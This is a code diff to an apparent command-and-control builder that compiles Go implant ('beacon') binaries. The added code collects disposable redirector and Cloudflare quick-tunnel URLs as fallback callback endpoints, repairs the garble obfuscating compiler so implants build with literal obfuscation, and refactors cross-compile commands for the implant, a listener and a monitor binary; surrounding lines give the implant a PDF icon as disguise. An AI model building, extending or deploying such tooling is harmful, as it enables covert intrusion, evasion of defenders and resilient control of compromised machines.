@@ -11,6 +11,7 @@ import json
 import os
 import re
 import shutil
+import subprocess
 import tempfile
 import time
 from collections.abc import Callable
@@ -176,6 +177,186 @@ def _render_template(content: str, context: dict[str, Any]) -> str:
     return re.sub(r"\{([a-zA-Z_]\w*)\}", _replacer, content)
 
 
+def _resolve_fallback_urls(params: dict[str, Any]) -> list[str]:
+    """Collect disposable redirector URLs for the Go beacon fallback list.
+
+    Sources, in order: ``c2_fallback_urls`` param (list or comma string),
+    ``sessions/redirectors.json`` state, and ``cf.log`` quick-tunnel URLs.
+
+    Args:
+        params: Live shell params dict.
+
+    Returns:
+        Deduplicated fallback URL list.
+    """
+    urls: list[str] = []
+    raw = params.get("c2_fallback_urls", "")
+    if isinstance(raw, list):
+        urls.extend(str(u).strip() for u in raw if str(u).strip())
+    elif isinstance(raw, str) and raw.strip():
+        urls.extend(u.strip() for u in raw.split(",") if u.strip())
+    try:
+        state_path = Path("sessions/redirectors.json")
+        if state_path.exists():
+            state = json.loads(state_path.read_text(encoding="utf-8"))
+            for entry in state.get("redirectors", []):
+                url = str(entry.get("url", "")).strip()
+                if url and url not in urls:
+                    urls.append(url)
+    except (OSError, json.JSONDecodeError):
+        pass
+    try:
+        cf_log = Path("cf.log")
+        if cf_log.exists():
+            content = cf_log.read_text(encoding="utf-8", errors="replace")
+            for match in re.findall(r"https://[-0-9a-z]+\.trycloudflare\.com", content):
+                if match not in urls:
+                    urls.append(match)
+    except OSError:
+        pass
+    return urls
+
+
+def _go_string_list(urls: list[str]) -> str:
+    """Format URLs as a Go string slice body.
+
+    Args:
+        urls: URL list.
+
+    Returns:
+        Go source fragment like ``"a", "b"`` or ``""`` when empty.
+    """
+    if not urls:
+        return '""'
+    return ", ".join(f'"{u}"' for u in urls)
+
+
+def _parse_go_version(text: str) -> tuple[int, int, int] | None:
+    """Parse a ``go version`` output line into a version triple.
+
+    Args:
+        text: Raw output such as ``go version go1.26.5 linux/amd64``.
+
+    Returns:
+        ``(major, minor, patch)`` triple, or None when unparseable.
+    """
+    match = re.search(r"go(\d+)\.(\d+)(?:\.(\d+))?", text or "")
+    if not match:
+        return None
+    return (int(match.group(1)), int(match.group(2)), int(match.group(3) or 0))
+
+
+def _command_output(argv: list[str], timeout: int = 30) -> str | None:
+    """Run a command in list form and return stripped stdout.
+
+    Args:
+        argv: Argument vector, never a shell string.
+        timeout: Seconds before aborting.
+
+    Returns:
+        Stripped stdout on success, None on any failure.
+    """
+    try:
+        result = subprocess.run(argv, capture_output=True, text=True, timeout=timeout, check=False)
+    except (OSError, subprocess.TimeoutExpired):
+        return None
+    if result.returncode != 0:
+        return None
+    return (result.stdout or "").strip()
+
+
+def _go_build_version(go_bin: str, target: str) -> tuple[int, int, int] | None:
+    """Report the Go toolchain version that built a binary.
+
+    Uses ``go version <file>``, which prints the compiler version stamped
+    into the binary at build time.
+
+    Args:
+        go_bin: Go binary used to query.
+        target: Binary to inspect (``go`` itself or ``garble``).
+
+    Returns:
+        Version triple, or None when it cannot be determined.
+    """
+    output = _command_output([go_bin, "version", target])
+    if not output:
+        return None
+    return _parse_go_version(output)
+
+
+def _garble_matches_toolchain(go_bin: str, garble_bin: str) -> bool:
+    """Check whether garble was built with the current Go toolchain.
+
+    A stale garble aborts every build with ``was built with ... can't be
+    used with the newer ...``. Go enforces an exact toolchain match, so the
+    full triple is compared before the build starts.
+
+    Args:
+        go_bin: Current Go binary.
+        garble_bin: Garble binary to validate.
+
+    Returns:
+        True when versions match exactly or cannot be determined.
+    """
+    current = _command_output([go_bin, "version"])
+    built_with = _command_output([go_bin, "version", garble_bin])
+    current_v = _parse_go_version(current or "")
+    built_v = _parse_go_version(built_with or "")
+    if current_v is None or built_v is None:
+        return True
+    return current_v == built_v
+
+
+def _build_compile_commands(
+    sessions_dir: str,
+    profile: Any,
+    gocompiler: str,
+    compile_flags: str,
+    main_out: str,
+    main_src: str,
+    listener_out: str,
+    listener_src: str,
+    monitor_out: str,
+    monitor_src: str,
+) -> tuple[str, str, str]:
+    """Build the three Go compile commands for the beacon pipeline.
+
+    Every command is prefixed with ``cd <sessions> &&`` so the shell
+    dispatcher routes it through ``bash -c``. A bare ``CGO_ENABLED=0 ...``
+    prefix would otherwise be split as an argv and fail with
+    ``FileNotFoundError: 'CGO_ENABLED=0'``.
+
+    Args:
+        sessions_dir: Sessions directory for the build working copy.
+        profile: Target platform profile with goos/goarch/cc/cgo/loader.
+        gocompiler: Compiler command prefix (garble or plain go).
+        compile_flags: ldflags fragment.
+        main_out: Output path of the main beacon binary.
+        main_src: Main beacon source file.
+        listener_out: Output path of the listener binary.
+        listener_src: Listener source file.
+        monitor_out: Output path of the monitor binary.
+        monitor_src: Monitor source file.
+
+    Returns:
+        Tuple of (main, listener, monitor) shell commands.
+    """
+    cc = f"CC={profile.cc} " if profile.cc else ""
+    main_cmd = (
+        f"cd {sessions_dir} && CGO_ENABLED={profile.cgo} {cc}GOOS={profile.goos} GOARCH={profile.goarch} "
+        f"{gocompiler} {compile_flags} -o {main_out} {main_src} {profile.loader}"
+    )
+    listener_cmd = (
+        f"cd {sessions_dir} && CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
+        f"{gocompiler} {compile_flags} -o {listener_out} {listener_src}"
+    )
+    monitor_cmd = (
+        f"cd {sessions_dir} && CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
+        f"{gocompiler} {compile_flags} -o {monitor_out} {monitor_src}"
+    )
+    return main_cmd, listener_cmd, monitor_cmd
+
+
 @contextmanager
 def _build_context(sessions_dir: str):
     """Backup ``sessions_dir`` before build and restore on failure."""
@@ -228,6 +409,44 @@ class C2Builder:
         self.toastr = toastr_fn
         self.c2_user = c2_user
         self.c2_pass = c2_pass
+
+    def _ensure_garble_toolchain(self, go_bin: str, garble_bin: str, gocompiler: str, profile: Any) -> str:
+        """Validate the Go toolchain before compiling and repair it.
+
+        Checks that garble exists, was built with the current Go release
+        (a stale garble aborts with ``can't be used with the newer ...``),
+        and that a C compiler is available when the profile needs CGO.
+        A stale garble is reinstalled automatically; when repair fails the
+        build falls back to plain ``go build`` instead of aborting.
+
+        Args:
+            go_bin: Resolved Go binary.
+            garble_bin: Resolved garble binary path.
+            gocompiler: Current compiler command prefix.
+            profile: Target platform profile.
+
+        Returns:
+            Usable compiler command prefix.
+        """
+        if "garble" not in gocompiler:
+            return gocompiler
+        if not os.path.isfile(garble_bin):
+            print_warn(f"Garble not found at {garble_bin}, falling back to plain go build.")
+            return f"{go_bin} build"
+        if not _garble_matches_toolchain(go_bin, garble_bin):
+            print_msg(f"Garble at {garble_bin} is stale for the current Go release, reinstalling ...")
+            self.cmd(f"{go_bin} install mvdan.cc/garble@latest")
+            self.cmd("sleep 2")
+            refreshed = shutil.which("garble") or os.path.expanduser("~/go/bin/garble")
+            if os.path.isfile(refreshed) and _garble_matches_toolchain(go_bin, refreshed):
+                return f"{refreshed} -literals -tiny build "
+            print_warn("Garble reinstall did not fix the toolchain mismatch, falling back to plain go build.")
+            return f"{go_bin} build"
+        if str(getattr(profile, "cgo", "0")) == "1":
+            cc = getattr(profile, "cc", "") or "gcc"
+            if not shutil.which(cc):
+                print_warn(f"C compiler '{cc}' not found but the {profile.goos} profile needs CGO. Install gcc to avoid a build failure.")
+        return gocompiler
 
     def run(self, line: str, choice: str | None, use_tunnel: bool) -> dict[str, Any]:
         """Execute the full C2 build pipeline.
@@ -359,6 +578,7 @@ chmod +x /tmp/stub && \
         else:
             garble_bin = shutil.which("garble") or os.path.expanduser("~/go/bin/garble")
             gocompiler = f"{garble_bin} -literals -tiny build "
+        gocompiler = self._ensure_garble_toolchain(go_bin, str(garble_bin), gocompiler, profile)
 
         file = f"{path}/modules/run"
         os.makedirs(f"{path}/sessions/win", exist_ok=True)
@@ -413,6 +633,7 @@ chmod +x /tmp/stub && \
             "url_traffic_2": url_traffic_2,
             "url_traffic_3": url_traffic_3,
             "listener": listener,
+            "c2_fallback_urls": _go_string_list(_resolve_fallback_urls(self.params)),
         }
 
         def _read(path_: str) -> str:
@@ -500,20 +721,17 @@ chmod +x /tmp/stub && \
             rsrc_bin = shutil.which("rsrc") or os.path.expanduser("~/go/bin/rsrc")
             self.cmd(f"{rsrc_bin} -ico static/pdf.ico -o sessions/icon.syso")
 
-        cc = f"CC={profile.cc} " if profile.cc else ""
-        cgo = f"CGO_ENABLED={profile.cgo} "
-
-        compile_command = (
-            f"cd {self.sessions_dir} && {cgo}{cc}GOOS={profile.goos} GOARCH={profile.goarch} "
-            f"{gocompiler} {compile_flags} -o {implantgo} {implant_go} {profile.loader}"
-        )
-        compile_command2 = (
-            f"CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
-            f"{gocompiler} {compile_flags} -o {implantgo2} {implant_go2}"
-        )
-        compile_command4 = (
-            f"CGO_ENABLED=0 GOOS={profile.goos} GOARCH={profile.goarch} "
-            f"{gocompiler} {compile_flags} -o sessions/monrevlin {monrevlin}"
+        compile_command, compile_command2, compile_command4 = _build_compile_commands(
+            self.sessions_dir,
+            profile,
+            gocompiler,
+            compile_flags,
+            implantgo,
+            implant_go,
+            implantgo2,
+            implant_go2,
+            f"{self.sessions_dir}/monrevlin",
+            monrevlin,
         )
 
         self.cmd(compile_command)
